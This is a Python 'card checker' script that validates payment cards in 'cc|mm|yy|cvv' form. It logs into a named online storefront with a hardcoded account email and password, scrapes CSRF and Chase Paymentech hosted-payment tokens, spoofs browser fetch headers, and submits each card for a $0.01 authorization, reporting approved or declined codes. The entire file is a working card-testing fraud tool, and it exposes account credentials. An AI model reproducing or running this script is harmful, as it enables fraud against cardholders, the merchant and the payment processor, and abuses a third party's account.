import html
import json
import re
import sys
import time
from urllib.parse import unquote_plus

import requests


# ---------------------------------------------------------------
# Configuration
# ---------------------------------------------------------------

MERCHANT_HOST  = "shop.skghoshassociates.com"
MERCHANT_URL   = f"https://{MERCHANT_HOST}"
CHASE_HOST     = "https://www.chasepaymentechhostedpay.com"
CHASE_ENDPOINT = f"{CHASE_HOST}/hpf/1_1/iframeprocessor.php"

CHECKOUT_ACCOUNT = {
    "username": "varun_8czei86y@joblymail.in",
    "password": "Subhamkumar07",
}

BILLING = {
    "address_id": "2246905",
    "name":       "Oggy",
    "amount":     "0.01",
    "currency":   "USD",
}

BROWSER_UA = (
    "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 "
    "(KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36"
)

REQUEST_TIMEOUT = 25

# Chase response-code reference (subset)
CHASE_CODES = {
    "00": "Approved",
    "05": "Do Not Honor",
    "14": "Invalid Card Number",
    "15": "Invalid Issuer",
    "41": "Lost Card",
    "43": "Stolen Card",
    "51": "Insufficient Funds",
    "54": "Expired Card",
    "57": "Transaction Not Permitted",
    "58": "Transaction Not Permitted",
    "61": "Exceeds Withdrawal Limit",
    "62": "Restricted Card",
    "65": "Exceeds Withdrawal Frequency",
    "78": "No Account",
    "91": "Issuer Unavailable",
    "96": "System Malfunction",
}


# ---------------------------------------------------------------
# Helpers
# ---------------------------------------------------------------

def card_brand(number):
    """Return Chase-compatible brand string for a PAN."""
    digits = re.sub(r"\D", "", number)
    if not digits:
        return "Visa"

    if digits[0] == "4":
        return "Visa"

    two = int(digits[:2]) if len(digits) >= 2 else 0
    if 51 <= two <= 55:
        return "MasterCard"
    if len(digits) >= 4 and 2221 <= int(digits[:4]) <= 2720:
        return "MasterCard"

    if two in (34, 37):
        return "AmericanExpress"

    if digits.startswith("6011") or two == 65:
        return "Discover"
    if len(digits) >= 3 and 644 <= int(digits[:3]) <= 649:
        return "Discover"

    if two == 35:
        return "JCB"

    return "Visa"


def normalise_year(year):
    """Chase HPF wants a 4-digit year on the wire."""
    year = year.strip()
    return year if len(year) == 4 else "20" + year


def first_match(patterns, text):
    for pattern in patterns:
        match = re.search(pattern, text, re.IGNORECASE)
        if match:
            return match
    return None


# ---------------------------------------------------------------
# Pipeline stages
# ---------------------------------------------------------------

def build_session():
    session = requests.Session()
    session.headers.update({
        "User-Agent":      BROWSER_UA,
        "Accept-Language": "en-GB,en;q=0.9",
    })
    return session


def prime_session(session):
    """Hit the storefront once so PHP session + form_key cookies exist."""
    headers = {
        "Accept":                    "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "Upgrade-Insecure-Requests": "1",
        "Sec-Fetch-Dest":            "document",
        "Sec-Fetch-Mode":            "navigate",
        "Sec-Fetch-Site":            "none",
        "Sec-Fetch-User":            "?1",
    }
    return session.get(f"{MERCHANT_URL}/", headers=headers, timeout=REQUEST_TIMEOUT)


def authenticate(session):
    """Sign into the storefront checkout account."""
    headers = {
        "Accept":           "*/*",
        "Content-Type":     "application/json",
        "Origin":           MERCHANT_URL,
        "Referer":          f"{MERCHANT_URL}/",
        "Sec-Fetch-Dest":   "empty",
        "Sec-Fetch-Mode":   "cors",
        "Sec-Fetch-Site":   "same-origin",
        "X-NewRelic-ID":    "UQIGWFdSGwIFVlRaAwYGUFQ=",
        "X-Requested-With": "XMLHttpRequest",
    }
    payload = {
        "username":        CHECKOUT_ACCOUNT["username"],
        "password":        CHECKOUT_ACCOUNT["password"],
        "captcha_form_id": "user_login",
        "context":         "checkout",
    }
    return session.post(
        f"{MERCHANT_URL}/customer/ajax/login/",
        headers=headers, json=payload, timeout=REQUEST_TIMEOUT,
    )


def open_add_card_page(session):
    """Load the add-card form and lift the CSRF form_key."""
    headers = {
        "Accept":                    "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "Referer":                   f"{MERCHANT_URL}/paymentechhpf/paymentoptions/savedcards/",
        "Sec-Fetch-Dest":            "empty",
        "Sec-Fetch-Mode":            "navigate",
        "Sec-Fetch-Site":            "same-origin",
        "Upgrade-Insecure-Requests": "1",
    }
    response = session.get(
        f"{MERCHANT_URL}/paymentechhpf/paymentoptions/addcard/",
        headers=headers, timeout=REQUEST_TIMEOUT,
    )
    match = re.search(
        r'<input[^>]*name=["\']form_key["\'][^>]*value=["\']([^"\']+)["\']',
        response.text,
    )
    form_key = match.group(1) if match else session.cookies.get("form_key")
    return response, form_key


def request_chase_iframe(session, form_key):
    """Ask the merchant to return the Chase-hosted iframe URL."""
    headers = {
        "Accept":                    "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "Cache-Control":             "max-age=0",
        "Content-Type":              "application/x-www-form-urlencoded",
        "Origin":                    MERCHANT_URL,
        "Referer":                   f"{MERCHANT_URL}/paymentechhpf/paymentoptions/addcard/",
        "Sec-Fetch-Dest":            "empty",
        "Sec-Fetch-Mode":            "navigate",
        "Sec-Fetch-Site":            "same-origin",
        "Upgrade-Insecure-Requests": "1",
    }
    body = {"address_id": BILLING["address_id"], "form_key": form_key}
    response = session.post(
        f"{MERCHANT_URL}/paymentechhpf/paymentoptions/cardinformation/",
        headers=headers, data=body, timeout=REQUEST_TIMEOUT,
    )

    match = first_match([
        r'<iframe[^>]*id=["\']paymentechhpf-iframe-recurring["\'][^>]*src=["\']([^"\']+)["\']',
        r'<iframe[^>]*src=["\']([^"\']*chasepaymentechhostedpay[^"\']+)["\']',
    ], response.text)

    if not match:
        return response, None
    return response, html.unescape(match.group(1).replace("\\/", "/"))


def load_chase_frame(session, chase_url):
    """
    Load the Chase HPF iframe the way a browser does. Chase rejects
    bare direct hits — the merchant Referer + iframe fetch metadata
    are mandatory.
    """
    headers = {
        "Accept":                    "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
        "Referer":                   f"{MERCHANT_URL}/paymentechhpf/paymentoptions/cardinformation/",
        "Upgrade-Insecure-Requests": "1",
        "Sec-Fetch-Site":            "cross-site",
        "Sec-Fetch-Mode":            "navigate",
        "Sec-Fetch-Dest":            "iframe",
        "Sec-Fetch-Storage-Access":  "active",
        "DNT":                       "1",
    }
    response = session.get(chase_url, headers=headers,
                           timeout=REQUEST_TIMEOUT, allow_redirects=True)

    sid_match     = re.search(r'name=["\']sid["\']\s+value=["\']([^"\']+)["\']', response.text)
    session_match = re.search(r'name=["\']sessionId["\']\s+value=["\']([^"\']+)["\']', response.text)

    sid        = sid_match.group(1)     if sid_match     else None
    session_id = session_match.group(1) if session_match else None
    return response, sid, session_id


def fetch_tracer(session, sid, referer):
    """Chase issues a short-lived tracer token before card processing."""
    headers = {
        "Accept":         "*/*",
        "Content-Type":   "application/x-www-form-urlencoded",
        "Origin":         CHASE_HOST,
        "Referer":        referer,
        "Sec-Fetch-Dest": "empty",
        "Sec-Fetch-Mode": "cors",
        "Sec-Fetch-Site": "same-origin",
    }
    response = session.post(
        CHASE_ENDPOINT, headers=headers,
        data={"action": "tracer", "sid": sid},
        timeout=REQUEST_TIMEOUT,
    )
    token = re.sub(r"[^A-Za-z0-9]", "", response.text or "")
    return response, token


def submit_card(session, sid, session_id, tracer, cc, mm, yy, cvv, brand, referer):
    """Post the card to Chase's processor."""
    headers = {
        "Accept":         "*/*",
        "Cache-Control":  "no-cache",
        "Content-Type":   "application/x-www-form-urlencoded",
        "Origin":         CHASE_HOST,
        "Referer":        referer,
        "Sec-Fetch-Dest": "empty",
        "Sec-Fetch-Mode": "cors",
        "Sec-Fetch-Site": "same-origin",
    }

    form = [
        ("sessionId",      session_id),
        ("amount",         BILLING["amount"]),
        ("required",       "all"),
        ("uIDTrans",       "1"),
        ("tdsApproved",    ""),
        ("tracer",         tracer),
        ("completeStatus", "0"),
        ("sid",            sid),
        ("currency_code",  BILLING["currency"]),
        ("cbOverride",     "1"),
        ("name",           BILLING["name"]),
        ("amountDisplay",  f"USD ${BILLING['amount']}"),
        ("ccNumber",       cc),
        ("CVV2",           cvv),
        ("ccType",         brand),
        ("expMonth",       mm.zfill(2)),
        ("expYear",        yy),
        ("action",         "process"),
        ("sid",            sid),
    ]
    return session.post(CHASE_ENDPOINT, headers=headers, data=form,
                        timeout=REQUEST_TIMEOUT + 10)


# ---------------------------------------------------------------
# Response parser
# ---------------------------------------------------------------

def parse_chase_response(body):
    """
    Convert a raw Chase response into a structured result.

    Keys returned:
        approved      (bool)          True when the gateway says OK
        code          (str | None)    2-digit response code ("00", "05", ...)
        message       (str)           plain text, e.g. "Do Not Honor"
        display       (str)           "Do Not Honor (05)"
        charge_type   (str | None)    "AUTH" on approval, None on decline
        raw           (str)           original body (for logging)
    """
    result = {
        "approved":    False,
        "code":        None,
        "message":     "",
        "display":     "",
        "charge_type": None,
        "raw":         body,
    }

    if not body:
        result["message"] = "Empty gateway response"
        result["display"] = result["message"]
        return result

    # --- Prefer JSON (Chase HPF AJAX bridge) ---
    payload = None
    try:
        payload = json.loads(body)
    except (ValueError, TypeError):
        payload = None

    if isinstance(payload, dict):
        gateway_message = unquote_plus(payload.get("gatewayMessage", "") or "")
        gateway_code    = unquote_plus(payload.get("gatewayCode", "")    or "")
        error_code      = payload.get("errorCode")
        status          = payload.get("xStatus")

        # Pull the 2-digit code from "(NN)" in the message or bare digits
        code_match = re.search(r"\((\d{2})\)", gateway_message) \
                     or re.search(r"(\d{2})", gateway_code)
        if code_match:
            result["code"] = code_match.group(1)

        # Strip the trailing "(NN)" for a clean message
        clean = re.sub(r"\s*\(\d{2}\)\s*$", "", gateway_message).strip()

        approved = (status == 1) or (result["code"] == "00")

        if approved:
            result["approved"]    = True
            result["code"]        = result["code"] or "00"
            result["message"]     = "Approved"
            # HPF 1.1 with action=process = authorization only. The
            # merchant must capture later to convert AUTH -> CHARGE.
            result["charge_type"] = "AUTH"
        else:
            if clean:
                result["message"] = clean
            elif result["code"] in CHASE_CODES:
                result["message"] = CHASE_CODES[result["code"]]
            elif error_code:
                result["message"] = f"Gateway Error {error_code}"
            else:
                result["message"] = "Card Declined"

        result["display"] = (
            f"{result['message']} ({result['code']})"
            if result["code"] else result["message"]
        )
        return result

    # --- Non-JSON fallback: scan for keywords ---
    lowered = body.lower()

    if "approved" in lowered and "declined" not in lowered:
        result.update(
            approved=True, code="00", message="Approved",
            display="Approved (00)", charge_type="AUTH",
        )
        return result

    if "do not honor" in lowered:
        result.update(code="05", message="Do Not Honor")
    elif "insufficient" in lowered:
        result.update(code="51", message="Insufficient Funds")
    elif "expired" in lowered:
        result.update(code="54", message="Expired Card")
    elif "declined" in lowered:
        result.update(message="Card Declined")
    else:
        result.update(message="Unknown Gateway Response")

    result["display"] = (
        f"{result['message']} ({result['code']})"
        if result["code"] else result["message"]
    )
    return result


# ---------------------------------------------------------------
# Public entry point
# ---------------------------------------------------------------

def run_check(card_string):
    """
    Run the full storefront -> Chase HPF pipeline for one card.

    card_string format: "cc|mm|yy|cvv"
    """
    started = time.time()

    try:
        cc, mm, yy, cvv = [p.strip() for p in card_string.split("|")]
    except ValueError:
        return {"error": "Invalid card format; expected CC|MM|YY|CVV"}

    year  = normalise_year(yy)
    brand = card_brand(cc)

    outcome = {
        "card":        f"{cc}|{mm}|{yy}|{cvv}",
        "brand":       brand,
        "gateway":     "Chase Paymentech HPF 1.1",
        "status":      "ERROR",
        "approved":    False,
        "code":        None,
        "response":    "",
        "detail":      "",
        "charge_type": None,
        "elapsed":     0.0,
    }

    session = build_session()

    try:
        prime_session(session)

        auth = authenticate(session)
        try:
            auth_json = auth.json()
        except ValueError:
            auth_json = {}
        if auth_json.get("errors"):
            outcome.update(
                status="ERROR",
                response="Merchant login rejected",
                detail=str(auth_json)[:200],
            )
            return _finalise(outcome, started)

        _, form_key = open_add_card_page(session)
        if not form_key:
            outcome.update(status="ERROR", response="form_key missing")
            return _finalise(outcome, started)

        _, chase_url = request_chase_iframe(session, form_key)
        if not chase_url:
            outcome.update(status="ERROR", response="Chase iframe URL missing")
            return _finalise(outcome, started)

        _, sid, session_id = load_chase_frame(session, chase_url)
        if not sid or not session_id:
            outcome.update(status="ERROR", response="sid/sessionId missing")
            return _finalise(outcome, started)

        _, tracer = fetch_tracer(session, sid, chase_url)
        if not tracer:
            outcome.update(status="ERROR", response="Tracer token missing")
            return _finalise(outcome, started)

        response = submit_card(
            session, sid, session_id, tracer,
            cc, mm, year, cvv, brand, chase_url,
        )
        parsed = parse_chase_response(response.text)

        if parsed["approved"]:
            outcome.update(
                status="APPROVED",
                approved=True,
                code=parsed["code"],
                response="Approved",
                detail=parsed["display"],
                charge_type=parsed["charge_type"],
            )
        else:
            outcome.update(
                status="DECLINED",
                approved=False,
                code=parsed["code"],
                response="Card Declined",
                detail=parsed["display"],
                charge_type=None,
            )

    except requests.exceptions.ProxyError:
        outcome.update(
            status="ERROR",
            response="Proxy unreachable",
            detail="Proxy not working - Dead proxy",
        )
    except requests.exceptions.ConnectTimeout:
        outcome.update(
            status="ERROR",
            response="Connection timeout",
            detail="Gateway did not respond in time",
        )
    except requests.exceptions.RequestException as exc:
        outcome.update(
            status="ERROR",
            response="Network error",
            detail=str(exc)[:200],
        )
    except Exception as exc:
        outcome.update(
            status="ERROR",
            response="Transaction failed",
            detail=f"{type(exc).__name__}: {exc}"[:200],
        )

    return _finalise(outcome, started)


def _finalise(outcome, started):
    outcome["elapsed"] = round(time.time() - started, 2)
    return outcome


# ---------------------------------------------------------------
# CLI
# ---------------------------------------------------------------

def _print_summary(result):
    line = "=" * 60
    print(line)
    print(f"  Card        : {result.get('card', '-')}")
    print(f"  Brand       : {result.get('brand', '-')}")
    print(f"  Status      : {result.get('status', '-')}")
    print(f"  Response    : {result.get('response', '-')}")
    print(f"  Detail      : {result.get('detail', '-')}")
    print(f"  Charge Type : {result.get('charge_type') or 'N/A'}")
    print(f"  Elapsed     : {result.get('elapsed', 0)} s")
    print(line)


def main():
    if len(sys.argv) > 1:
        card = sys.argv[1].strip()
    else:
        card = input("CC (cc|mm|yy|cvv) > ").strip()

    result = run_check(card)
    _print_summary(result)


if __name__ == "__main__":
    main()